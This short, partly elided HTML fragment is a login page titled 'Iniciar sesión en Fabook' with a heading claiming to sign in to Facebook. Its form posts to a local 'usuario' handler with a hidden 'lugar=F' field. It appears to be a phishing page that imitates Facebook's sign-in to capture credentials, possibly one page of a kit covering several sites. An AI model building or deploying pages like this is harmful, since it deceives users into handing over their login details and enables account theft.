...
<head>
    ...
    <title>Iniciar sesión en Fabook</title>
</head>
<body>
    <main> 
        <p>
            <h1 class="sesion">Iniciar Sesión en Facebook</h1>
        </p>
    </main>
    <center><form action="usuario" method="post">
        ...
        <br>
        <input class="input" type="hidden" name="lugar" value="F">
        <br>
        <input class="iniciar" type="submit" name="usuario" value="Iniciar Sesion en Facebook">
    </form></center>
